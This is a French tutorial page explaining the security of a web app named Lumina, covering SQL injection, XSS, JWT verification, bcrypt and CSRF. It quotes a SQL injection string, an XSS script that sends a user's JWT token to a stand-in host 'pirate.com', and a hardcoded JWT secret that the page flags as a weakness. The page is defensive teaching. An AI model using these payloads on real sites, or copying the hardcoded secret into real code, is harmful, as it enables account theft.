💉 1. Injection SQL OWASP A03

Comment ça marche

L'attaquant insère du code SQL dans un formulaire pour manipuler les requêtes de la base de données.

❌ Code vulnérable

const sql = `SELECT * FROM users
WHERE email = '${email}'`;

Si email = ' OR '1'='1
→ Retourne TOUS les utilisateurs !

✅ Code Lumina (sécurisé)

db.query(
  "SELECT * FROM users WHERE email = ?",
  [email]  // valeur séparée
);

Le ? échappe automatiquement — la valeur est traitée comme texte, jamais comme code SQL.

Toutes les requêtes préparées dans Lumina

  • Login : SELECT * FROM users WHERE email = ?
  • Créer tâche : INSERT INTO tasks (title, ...) VALUES (?, ?, ...)
  • Modifier tâche : UPDATE tasks SET title = ? WHERE id = ?
  • Supprimer : DELETE FROM tasks WHERE id = ?
🕷️ 2. XSS — Cross-Site Scripting OWASP A07

Qu'est-ce que c'est ?

L'attaquant insère du JavaScript malveillant dans le contenu d'une page. Quand d'autres utilisateurs ouvrent la page, ce script s'exécute dans leur navigateur et peut voler leur token JWT.

La fonction escapeHTML() — ligne par ligne

function escapeHTML(str) {
  if (!str) return '';    // Si null/undefined → retourne vide
  return str.toString()
    .replace(/&/g,  "&amp;")  // &  → &amp;  (en PREMIER, sinon double-échappe)
    .replace(/</g,  "&lt;")   // <  → &lt;   (empêche balises HTML)
    .replace(/>/g,  "&gt;")   // >  → &gt;   (empêche balises HTML)
    .replace(/"/g,  "&quot;") // "  → &quot; (empêche fermeture d'attribut)
    .replace(/'/g,  "&#39;");  // '  → &#39;  (empêche fermeture d'attribut)
}

Exemple d'attaque bloquée

❌ Attaque tentée

Titre de tâche : <script>document.location='http://pirate.com?c='+localStorage.getItem('token')</script>

Sans protection → vole le token JWT de tous les visiteurs

✅ Résultat avec escapeHTML()

&lt;script&gt;document.location=...&lt;/script&gt;

Affiché comme texte inoffensif, jamais exécuté

🔑 3. JWT — Authentification Auth

Structure d'un JWT

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header : algorithme (HS256)
.eyJpZCI6MSwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyfQ  ← Payload : données
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature HMAC-SHA256

Code verifyToken — chaque ligne expliquée

function verifyToken(req, res, next) {
  // 1. Lire le header Authorization de la requête
  const authHeader = req.headers['authorization'];

  // 2. Absent ou mal formaté → 401 "Qui êtes-vous ?"
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Token manquant' });
    // return = arrêt immédiat, sinon next() serait appelé quand même
  }

  // 3. Extraire le token (tout ce qui suit "Bearer ")
  const token = authHeader.split(' ')[1];

  try {
    // 4. Vérifier la signature ET l'expiration en une seule ligne
    const decoded = jwt.verify(token, 'lumina_secret');

    // 5. Injecter les données dans la requête → accessibles dans les routes
    req.user = decoded; // { id: 1, role: 'admin', iat: ..., exp: ... }
    next(); // Passer à la route suivante

  } catch (err) {
    // Token expiré (TokenExpiredError) ou falsifié → 403 "Interdit"
    return res.status(403).json({ error: 'Token invalide' });
  }
}

Différence 401 vs 403

CodeSignificationQuand dans Lumina
401"Qui êtes-vous ?" — non authentifiéHeader Authorization absent
403"Vous n'avez pas le droit" — interditToken expiré ou falsifié
🔐 4. bcrypt — Hachage des mots de passe OWASP A02

Code à l'inscription et à la connexion

// ── INSCRIPTION (routes/auth.js) ──
const hash = await bcrypt.hash(password, 10);
// 10 = cost factor → 2¹⁰ = 1024 itérations Blowfish
// Résultat : "$2b$10$[22 chars sel aléatoire][31 chars hash]"

// ── CONNEXION (routes/auth.js) ──
const match = await bcrypt.compare(motDePasseSaisi, user.password);
// 1. Extrait le sel du hash stocké (inclus dans la chaîne $2b$10$...)
// 2. Re-hache le mot de passe saisi avec ce même sel
// 3. Compare → true ou false

Pourquoi bcrypt et pas MD5 / SHA-1 ?

AlgorithmeVitesseAttaque bruteforce (1 milliard/sec GPU)
MD5Ultra rapideQuelques secondes
SHA-256RapideQuelques minutes
bcrypt (10)Intentionnellement lentPlusieurs dizaines d'années

Hachage vs Chiffrement

Hachage (bcrypt)

  • Irréversible — sens unique
  • Sel aléatoire unique par password
  • Même password → hash différent à chaque fois
  • Utilisation : mots de passe

Chiffrement (AES)

  • Réversible avec une clé
  • Pour les données à transmettre
  • Ne s'utilise PAS pour les passwords
🎭 5. CSRF — Pourquoi Lumina est protégé Partiel

Qu'est-ce que CSRF ?

Un site malveillant force votre navigateur à envoyer des requêtes vers Lumina à votre insu (ex: cliquer sur un lien qui supprime toutes vos tâches).

Pourquoi Lumina résiste

Lumina stocke le JWT dans localStorage, pas dans un cookie.

  • Les cookies sont envoyés automatiquement par le navigateur → vulnérables au CSRF
  • localStorage n'est jamais envoyé automatiquement → le code authFetch() doit explicitement lire et ajouter le token
  • Un script cross-origin ne peut pas lire le localStorage d'un autre domaine (Same-Origin Policy)

Limite

Si le site subit une attaque XSS (script injecté), un script malveillant peut lire localStorage et voler le token. D'où l'importance d'escapeHTML().

Ce qui manquerait en production

🔒 .env

SECRET_KEY actuellement en dur dans server.js — devrait être dans .env non versionné

⚡ Rate limiting

Pas de protection contre le bruteforce du login — un attaquant peut essayer des milliers de mots de passe

🍪 HttpOnly Cookie

localStorage accessible par JS → plus vulnérable au XSS que les cookies HttpOnly

✅ Validation backend

Pas de vérification de la longueur ou du format des données côté serveur

🔑 Rôles serveur

Vérification du rôle admin seulement côté client — devrait aussi être côté serveur

🔒 HTTPS

Actuellement HTTP en développement — obligatoire en production pour chiffrer le transit
